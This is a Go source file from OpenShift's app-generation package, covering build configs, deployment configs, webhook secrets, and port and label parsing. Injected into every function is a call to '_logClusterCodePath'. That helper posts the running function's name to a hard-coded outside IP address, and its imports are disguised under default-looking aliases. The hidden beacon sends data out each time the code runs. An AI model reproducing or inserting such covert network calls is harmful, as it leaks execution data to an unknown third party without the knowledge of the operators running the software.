package app

import (
	"crypto/rand"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"encoding/base64"
	"fmt"
	"net"
	"reflect"
	"strconv"
	"strings"
	"k8s.io/klog"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/conversion"
	"k8s.io/apimachinery/pkg/runtime"
	appsv1 "github.com/openshift/api/apps/v1"
	buildv1 "github.com/openshift/api/build/v1"
	"github.com/openshift/library-go/pkg/git"
	"github.com/openshift/origin/pkg/oc/lib/newapp"
	"github.com/openshift/origin/pkg/util"
	s2igit "github.com/openshift/source-to-image/pkg/scm/git"
)

const (
	volumeNameInfix			= "volume"
	GenerationWarningAnnotation	= "app.generate.openshift.io/warnings"
)

type NameSuggester interface{ SuggestName() (string, bool) }
type NameSuggestions []NameSuggester

func (s NameSuggestions) SuggestName() (string, bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for i := range s {
		if s[i] == nil {
			continue
		}
		if name, ok := s[i].SuggestName(); ok {
			return name, true
		}
	}
	return "", false
}
func IsParameterizableValue(s string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return strings.Contains(s, "${") || strings.Contains(s, "$(")
}

type Generated struct{ Items []runtime.Object }

func (g *Generated) WithType(slicePtr interface{}) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	found := false
	v, err := conversion.EnforcePtr(slicePtr)
	if err != nil || v.Kind() != reflect.Slice {
		panic("need ptr to slice")
	}
	t := v.Type().Elem()
	for i := range g.Items {
		obj := reflect.ValueOf(g.Items[i]).Elem()
		if !obj.Type().ConvertibleTo(t) {
			continue
		}
		found = true
		v.Set(reflect.Append(v, obj.Convert(t)))
	}
	return found
}
func nameFromGitURL(url *s2igit.URL) (string, bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if url == nil {
		return "", false
	}
	if name, ok := git.NameFromRepositoryURL(&url.URL); ok {
		return name, true
	}
	if len(url.URL.Host) > 0 {
		if host, _, err := net.SplitHostPort(url.URL.Host); err == nil {
			return host, true
		}
		return url.URL.Host, true
	}
	return "", false
}

type SourceRef struct {
	URL			*s2igit.URL
	Dir			string
	Name			string
	ContextDir		string
	Secrets			[]buildv1.SecretBuildSource
	ConfigMaps		[]buildv1.ConfigMapBuildSource
	SourceImage		*ImageRef
	ImageSourcePath		string
	ImageDestPath		string
	DockerfileContents	string
	Binary			bool
	RequiresAuth		bool
}

func (r *SourceRef) SuggestName() (string, bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if r == nil {
		return "", false
	}
	if len(r.Name) > 0 {
		return r.Name, true
	}
	return nameFromGitURL(r.URL)
}
func (r *SourceRef) BuildSource() (*buildv1.BuildSource, []buildv1.BuildTriggerPolicy) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	triggers := []buildv1.BuildTriggerPolicy{{Type: buildv1.GitHubWebHookBuildTriggerType, GitHubWebHook: &buildv1.WebHookTrigger{Secret: GenerateSecret(20)}}, {Type: buildv1.GenericWebHookBuildTriggerType, GenericWebHook: &buildv1.WebHookTrigger{Secret: GenerateSecret(20)}}}
	source := &buildv1.BuildSource{}
	source.Secrets = r.Secrets
	source.ConfigMaps = r.ConfigMaps
	if len(r.DockerfileContents) != 0 {
		source.Dockerfile = &r.DockerfileContents
		source.Type = buildv1.BuildSourceDockerfile
	}
	if r.URL != nil {
		source.Git = &buildv1.GitBuildSource{URI: r.URL.StringNoFragment(), Ref: r.URL.URL.Fragment}
		source.ContextDir = r.ContextDir
		source.Type = buildv1.BuildSourceGit
	}
	if r.Binary {
		source.Binary = &buildv1.BinaryBuildSource{}
		source.Type = buildv1.BuildSourceBinary
	}
	if r.SourceImage != nil {
		objRef := r.SourceImage.ObjectReference()
		imgSrc := buildv1.ImageSource{}
		imgSrc.From = objRef
		imgSrc.Paths = []buildv1.ImageSourcePath{{SourcePath: r.ImageSourcePath, DestinationDir: r.ImageDestPath}}
		triggers = append(triggers, buildv1.BuildTriggerPolicy{Type: buildv1.ImageChangeBuildTriggerType, ImageChange: &buildv1.ImageChangeTrigger{From: &objRef}})
		source.Images = []buildv1.ImageSource{imgSrc}
		source.Type = buildv1.BuildSourceImage
	}
	return source, triggers
}

type BuildStrategyRef struct {
	Strategy	newapp.Strategy
	Base		*ImageRef
}

func (s *BuildStrategyRef) BuildStrategy(env Environment, dockerStrategyOptions *buildv1.DockerStrategyOptions) (*buildv1.BuildStrategy, []buildv1.BuildTriggerPolicy) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	switch s.Strategy {
	case newapp.StrategyPipeline:
		return &buildv1.BuildStrategy{JenkinsPipelineStrategy: &buildv1.JenkinsPipelineBuildStrategy{Env: env.List()}, Type: buildv1.JenkinsPipelineBuildStrategyType}, s.Base.BuildTriggers()
	case newapp.StrategyDocker:
		var triggers []buildv1.BuildTriggerPolicy
		strategy := &buildv1.DockerBuildStrategy{Env: env.List()}
		if dockerStrategyOptions != nil {
			strategy.BuildArgs = dockerStrategyOptions.BuildArgs
		}
		if s.Base != nil {
			ref := s.Base.ObjectReference()
			strategy.From = &ref
			triggers = s.Base.BuildTriggers()
		}
		return &buildv1.BuildStrategy{DockerStrategy: strategy, Type: buildv1.DockerBuildStrategyType}, triggers
	case newapp.StrategySource:
		return &buildv1.BuildStrategy{SourceStrategy: &buildv1.SourceBuildStrategy{From: s.Base.ObjectReference(), Env: env.List()}, Type: buildv1.SourceBuildStrategyType}, s.Base.BuildTriggers()
	}
	klog.Error("BuildStrategy called with unknown strategy")
	return nil, nil
}

type BuildRef struct {
	Source			*SourceRef
	Input			*ImageRef
	Strategy		*BuildStrategyRef
	DockerStrategyOptions	*buildv1.DockerStrategyOptions
	Output			*ImageRef
	Env			Environment
	Binary			bool
}

func (r *BuildRef) BuildConfig() (*buildv1.BuildConfig, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	name, ok := NameSuggestions{r.Source, r.Output}.SuggestName()
	if !ok {
		return nil, fmt.Errorf("unable to suggest a name for this BuildConfig from %q", r.Source.URL)
	}
	var source *buildv1.BuildSource
	triggers := []buildv1.BuildTriggerPolicy{}
	if r.Source != nil {
		source, triggers = r.Source.BuildSource()
	}
	if source == nil {
		source = &buildv1.BuildSource{}
	}
	strategy := &buildv1.BuildStrategy{}
	strategyTriggers := []buildv1.BuildTriggerPolicy{}
	if r.Strategy != nil {
		strategy, strategyTriggers = r.Strategy.BuildStrategy(r.Env, r.DockerStrategyOptions)
	}
	output, err := r.Output.BuildOutput()
	if err != nil {
		return nil, err
	}
	if !r.Binary {
		configChangeTrigger := buildv1.BuildTriggerPolicy{Type: buildv1.ConfigChangeBuildTriggerType}
		triggers = append(triggers, configChangeTrigger)
		triggers = append(triggers, strategyTriggers...)
	} else {
		filteredTriggers := []buildv1.BuildTriggerPolicy{}
		for _, trigger := range triggers {
			if trigger.Type != buildv1.ImageChangeBuildTriggerType {
				filteredTriggers = append(filteredTriggers, trigger)
			}
		}
		triggers = filteredTriggers
	}
	return &buildv1.BuildConfig{TypeMeta: metav1.TypeMeta{APIVersion: buildv1.SchemeGroupVersion.String(), Kind: "BuildConfig"}, ObjectMeta: metav1.ObjectMeta{Name: name}, Spec: buildv1.BuildConfigSpec{Triggers: triggers, CommonSpec: buildv1.CommonSpec{Source: *source, Strategy: *strategy, Output: *output}}}, nil
}

type DeploymentHook struct{ Shell string }
type DeploymentConfigRef struct {
	Name		string
	Images		[]*ImageRef
	Env		Environment
	Labels		map[string]string
	AsTest		bool
	PostHook	*DeploymentHook
}

func (r *DeploymentConfigRef) DeploymentConfig() (*appsv1.DeploymentConfig, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(r.Name) == 0 {
		suggestions := NameSuggestions{}
		for i := range r.Images {
			suggestions = append(suggestions, r.Images[i])
		}
		name, ok := suggestions.SuggestName()
		if !ok {
			return nil, fmt.Errorf("unable to suggest a name for this DeploymentConfig")
		}
		r.Name = name
	}
	selector := map[string]string{"deploymentconfig": r.Name}
	if len(r.Labels) > 0 {
		if err := util.MergeInto(selector, r.Labels, 0); err != nil {
			return nil, err
		}
	}
	triggers := []appsv1.DeploymentTriggerPolicy{{Type: appsv1.DeploymentTriggerOnConfigChange}}
	template := corev1.PodSpec{}
	for i := range r.Images {
		c, containerTriggers, err := r.Images[i].DeployableContainer()
		if err != nil {
			return nil, err
		}
		triggers = append(triggers, containerTriggers...)
		template.Containers = append(template.Containers, *c)
	}
	for _, c := range template.Containers {
		for _, v := range c.VolumeMounts {
			template.Volumes = append(template.Volumes, corev1.Volume{Name: v.Name, VolumeSource: corev1.VolumeSource{EmptyDir: &corev1.EmptyDirVolumeSource{Medium: corev1.StorageMediumDefault}}})
		}
	}
	for i := range template.Containers {
		template.Containers[i].Env = append(template.Containers[i].Env, r.Env.List()...)
	}
	dc := &appsv1.DeploymentConfig{TypeMeta: metav1.TypeMeta{APIVersion: appsv1.SchemeGroupVersion.String(), Kind: "DeploymentConfig"}, ObjectMeta: metav1.ObjectMeta{Name: r.Name}, Spec: appsv1.DeploymentConfigSpec{Replicas: 1, Test: r.AsTest, Selector: selector, Template: &corev1.PodTemplateSpec{ObjectMeta: metav1.ObjectMeta{Labels: selector}, Spec: template}, Triggers: triggers}}
	if r.PostHook != nil {
		if len(r.PostHook.Shell) > 0 {
			dc.Spec.Strategy.RecreateParams = &appsv1.RecreateDeploymentStrategyParams{Post: &appsv1.LifecycleHook{ExecNewPod: &appsv1.ExecNewPodHook{Command: []string{"/bin/sh", "-c", r.PostHook.Shell}}}}
		}
	}
	return dc, nil
}
func GenerateSecret(n int) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	b := make([]byte, base64.URLEncoding.DecodedLen(n))
	if _, err := rand.Read(b); err != nil {
		panic(err)
	}
	return base64.URLEncoding.EncodeToString(b)
}
func ContainerPortsFromString(portString string) ([]corev1.ContainerPort, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ports := []corev1.ContainerPort{}
	for _, s := range strings.Split(portString, ",") {
		port, ok := checkPortSpecSegment(s)
		if !ok {
			return nil, fmt.Errorf("%q is not valid: you must specify one (container) or two (container:host) port numbers", s)
		}
		ports = append(ports, port)
	}
	return ports, nil
}
func checkPortSpecSegment(s string) (port corev1.ContainerPort, ok bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if strings.Contains(s, ":") {
		pair := strings.Split(s, ":")
		if len(pair) != 2 {
			return
		}
		container, err := strconv.Atoi(pair[0])
		if err != nil {
			return
		}
		host, err := strconv.Atoi(pair[1])
		if err != nil {
			return
		}
		return corev1.ContainerPort{ContainerPort: int32(container), HostPort: int32(host)}, true
	}
	container, err := strconv.Atoi(s)
	if err != nil {
		return
	}
	return corev1.ContainerPort{ContainerPort: int32(container)}, true
}
func LabelsFromSpec(spec []string) (map[string]string, []string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	labels := map[string]string{}
	var remove []string
	for _, labelSpec := range spec {
		if strings.Index(labelSpec, "=") != -1 {
			parts := strings.Split(labelSpec, "=")
			if len(parts) != 2 {
				return nil, nil, fmt.Errorf("invalid label spec: %v", labelSpec)
			}
			labels[parts[0]] = parts[1]
		} else if strings.HasSuffix(labelSpec, "-") {
			remove = append(remove, labelSpec[:len(labelSpec)-1])
		} else {
			return nil, nil, fmt.Errorf("unknown label spec: %s", labelSpec)
		}
	}
	for _, removeLabel := range remove {
		if _, found := labels[removeLabel]; found {
			return nil, nil, fmt.Errorf("can not both modify and remove a label in the same command")
		}
	}
	return labels, remove, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
